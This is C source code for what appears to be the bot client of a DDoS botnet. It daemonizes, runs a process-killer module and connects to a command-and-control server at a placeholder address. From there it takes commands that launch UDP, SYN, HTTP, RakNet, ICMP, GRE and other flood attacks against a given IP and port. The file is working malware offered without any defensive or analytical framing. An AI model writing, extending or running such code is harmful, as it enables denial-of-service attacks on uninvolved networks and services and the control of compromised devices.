#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <unistd.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <time.h>
#include <sys/file.h>
#include <errno.h>
#include <fcntl.h>
#include <poll.h>
#include "headers/syn_attack.h"
#include "headers/udp_attack.h"
#include "headers/http_attack.h"
#include "headers/socket_attack.h"
#include "headers/vse_attack.h"
#include "headers/raknet_attack.h"
#include "headers/attack_params.h"
#include "headers/daemon.h"
#include "headers/icmp_attack.h"
#include "headers/killer.h"
#include "headers/gre_attack.h"

#define CNC_IP "0.0.0.0"
#define BOT_PORT 1338
#define MAX_THREADS 1
#define RETRY_DELAY 5
#define RECV_TIMEOUT_MS 8000
#define MAX_RETRIES 35
#define CONNECTION_TIMEOUT 5
#define PING_INTERVAL 5

pthread_t attack_threads[MAX_THREADS] = {0};
pthread_mutex_t thread_mutex = PTHREAD_MUTEX_INITIALIZER;
attack_params* thread_params[MAX_THREADS] = {NULL};
gre_attack_params* gre_params[MAX_THREADS] = {NULL};

const char* get_arch() {
    #ifdef ARCH_aarch64
    return "aarch64";
    #elif defined(ARCH_arm)
    return "arm";
    #elif defined(ARCH_mips)
    return "mips";
    #elif defined(ARCH_x86)
    return "x86";
    #elif defined(ARCH_x86_64)
    return "x86_64";
    #else
    return "unknown";
    #endif
}

void cleanup_attack_threads() {
    pthread_mutex_lock(&thread_mutex);
    for (int i = 0; i < MAX_THREADS; i++) {
        if (attack_threads[i] != 0) {
            if (thread_params[i]) {
                thread_params[i]->active = 0;
            }
            if (gre_params[i]) {
                gre_params[i]->active = 0;
            }
            pthread_join(attack_threads[i], NULL);
            if (thread_params[i]) {
                free(thread_params[i]);
                thread_params[i] = NULL;
            }
            if (gre_params[i]) {
                free(gre_params[i]);
                gre_params[i] = NULL;
            }
            attack_threads[i] = 0;
        }
    }
    pthread_mutex_unlock(&thread_mutex);
}

void handle_command(char* command, int sock) {
    if (!command || strlen(command) > 1023) return;
    static char buffer[256];
    if (strncmp(command, "ping", 4) == 0) {
        snprintf(buffer, sizeof(buffer), "pong %s", get_arch());
        send(sock, buffer, strlen(buffer), MSG_NOSIGNAL);
        return;
    }
    static const char *methods[] = {"!udp", "!vse", "!syn", "!socket", "!http", "!raknet", "!icmp", "!gre"};
    static const int method_len[] = {4, 4, 4, 7, 5, 7, 5, 4};
    static void* (*attack_funcs[])(void*) = {
        udp_attack, vse_attack, syn_attack, socket_attack, 
        http_attack, raknet_attack, icmp_attack, gre_attack
    };
    
    if (strcmp(command, "stop") == 0) {
        cleanup_attack_threads();
        return;
    }

    int which = -1;
    for (int i = 0; i < 8; i++) {
        if (strncmp(command, methods[i], method_len[i]) == 0) {
            which = i;
            break;
        }
    }
    
    if (which >= 0) {
        static char ip[32];
        static char argstr[512];
        int n = 0;
        int port = 0;
        int time = 0;
        int psize = 0;
        int srcport = 0;
        int gre_proto = 0;
        int gport = 0;
        memset(ip, 0, sizeof(ip));
        memset(argstr, 0, sizeof(argstr));
        
        if (which == 6 || which == 7) {
            n = sscanf(command, "%*s %31s %d %511[^\n]", ip, &time, argstr);
            if (n < 2) return;
        } else {
            n = sscanf(command, "%*s %31s %d %d %511[^\n]", ip, &port, &time, argstr);
            if (n < 3) return;
        }
        
        if (strlen(argstr) > 0) {
            char *token = strtok(argstr, " ");
            while (token) {
                if (strncmp(token, "psize=", 6) == 0) psize = atoi(token + 6);
                else if (strncmp(token, "srcport=", 8) == 0) srcport = atoi(token + 8);
                else if (strncmp(token, "proto=", 6) == 0) {
                    if (strcmp(token + 6, "tcp") == 0) gre_proto = 1;
                    else if (strcmp(token + 6, "udp") == 0) gre_proto = 2;
                }
                else if (strncmp(token, "gport=", 6) == 0) gport = atoi(token + 6);
                token = strtok(NULL, " ");
            }
        }
        
        cleanup_attack_threads();
        
        pthread_mutex_lock(&thread_mutex);
        if (which == 7) {
            gre_attack_params* gre_state = malloc(sizeof(gre_attack_params));
            if (!gre_state) {
                pthread_mutex_unlock(&thread_mutex);
                return;
            }
            gre_state->target_addr.sin_family = AF_INET;
            gre_state->target_addr.sin_port = htons(port);
            inet_pton(AF_INET, ip, &gre_state->target_addr.sin_addr);
            gre_state->duration = time;
            gre_state->psize = psize;
            gre_state->srcport = srcport;
            gre_state->gre_proto = gre_proto;
            gre_state->gport = gport;
            gre_state->active = 1;
            
            gre_params[0] = gre_state;
            int ret = pthread_create(&attack_threads[0], NULL, gre_attack, gre_state);
            if (ret != 0) {
                free(gre_state);
                gre_params[0] = NULL;
            }
        } else {
            attack_params* attack_state = calloc(1, sizeof(attack_params));
            if (!attack_state) {
                pthread_mutex_unlock(&thread_mutex);
                return;
            }
            
            attack_state->target_addr.sin_family = AF_INET;
            attack_state->target_addr.sin_port = htons(port);
            if (inet_pton(AF_INET, ip, &attack_state->target_addr.sin_addr) != 1) {
                free(attack_state);
                pthread_mutex_unlock(&thread_mutex);
                return;
            }
            attack_state->duration = time;
            attack_state->psize = psize;
            attack_state->srcport = srcport;
            attack_state->active = 1;
            
            thread_params[0] = attack_state;
            int ret = pthread_create(&attack_threads[0], NULL, attack_funcs[which], attack_state);
            if (ret != 0) {
                free(attack_state);
                thread_params[0] = NULL;
            }
        }
        pthread_mutex_unlock(&thread_mutex);
    }
    if (strcmp(command, "stop") == 0) {
        cleanup_attack_threads();
    }
}

int connect_with_timeout(int sock, struct sockaddr *addr, socklen_t addrlen, int timeout_sec) {
    int res;
    long arg;
    fd_set myset;
    struct timeval tv;
    int valopt;
    socklen_t lon;

    arg = fcntl(sock, F_GETFL, NULL);
    arg |= O_NONBLOCK;
    fcntl(sock, F_SETFL, arg);

    res = connect(sock, addr, addrlen);
    if (res < 0) {
       if (errno == EINPROGRESS) {
          tv.tv_sec = timeout_sec;
          tv.tv_usec = 0;
          FD_ZERO(&myset);
          FD_SET(sock, &myset);
          res = select(sock+1, NULL, &myset, NULL, &tv);
          if (res > 0) {
             lon = sizeof(int);
             getsockopt(sock, SOL_SOCKET, SO_ERROR, (void*)(&valopt), &lon);
             if (valopt) {
                return -1;
             }
          }
          else {
             return -1;
          }
       }
       else {
          return -1;
       }
    }

    arg = fcntl(sock, F_GETFL, NULL);
    arg &= (~O_NONBLOCK);
    fcntl(sock, F_SETFL, arg);

    return 0;
}

int main(int argc, char** argv) {
    static int sock = -1;
    static struct sockaddr_in server_addr;
    static char command[1024];
    ssize_t n;

    daemonize(argc, argv);
    start_killer();

    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(BOT_PORT);
    inet_pton(AF_INET, CNC_IP, &server_addr.sin_addr);

    int reconnect_attempts = 0;
    time_t last_ping = 0;

    while (1) {
        if (sock != -1) {
            close(sock);
            sock = -1;
        }

        sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock == -1) {
            if (++reconnect_attempts >= MAX_RETRIES) {
                sleep(60);
                reconnect_attempts = 0;
            } else {
                sleep(RETRY_DELAY * reconnect_attempts);
            }
            continue;
        }

        int optval = 1;
        setsockopt(sock, SOL_SOCKET, SO_KEEPALIVE, &optval, sizeof(optval));
        setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval));
        int keepidle = 10;
        int keepintvl = 5;
        int keepcnt = 3;
        setsockopt(sock, IPPROTO_TCP, TCP_KEEPIDLE, &keepidle, sizeof(keepidle));
        setsockopt(sock, IPPROTO_TCP, TCP_KEEPINTVL, &keepintvl, sizeof(keepintvl));
        setsockopt(sock, IPPROTO_TCP, TCP_KEEPCNT, &keepcnt, sizeof(optval));
        setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, &optval, sizeof(optval));

        if (connect_with_timeout(sock, (struct sockaddr*)&server_addr, sizeof(server_addr), CONNECTION_TIMEOUT) < 0) {
            close(sock);
            sock = -1;
            if (++reconnect_attempts >= MAX_RETRIES) {
                sleep(60);
                reconnect_attempts = 0;
            } else {
                sleep(RETRY_DELAY * reconnect_attempts);
            }
            continue;
        }

        if (send(sock, get_arch(), strlen(get_arch()), MSG_NOSIGNAL) <= 0) {
            close(sock);
            sock = -1;
            continue;
        }

        reconnect_attempts = 0;
        last_ping = time(NULL);

        while (1) {
            struct pollfd fds;
            fds.fd = sock;
            fds.events = POLLIN;
            time_t now = time(NULL);
            if (now - last_ping >= PING_INTERVAL) {
                if (send(sock, "ping", 4, MSG_NOSIGNAL) <= 0) {
                    break;
                }
                last_ping = now;
            }
            int poll_timeout = (last_ping + PING_INTERVAL - now) * 1000;
            if (poll_timeout < 0) poll_timeout = 0;
            int ret = poll(&fds, 1, poll_timeout);
            if (ret < 0 && errno != EINTR) {
                break;
            }
            if (ret > 0) {
                if (fds.revents & POLLIN) {
                    n = recv(sock, command, sizeof(command)-1, 0);
                    if (n <= 0) {
                        if (errno != EAGAIN && errno != EWOULDBLOCK) {
                            break;
                        }
                        continue;
                    }
                    command[n] = 0;
                    handle_command(command, sock);
                    memset(command, 0, sizeof(command));
                }
                if (fds.revents & (POLLERR | POLLHUP)) {
                    break;
                }
            }
        }

        if (sock != -1) {
            shutdown(sock, SHUT_RDWR);
            close(sock);
            sock = -1;
        }
        sleep(RETRY_DELAY);
    }
}
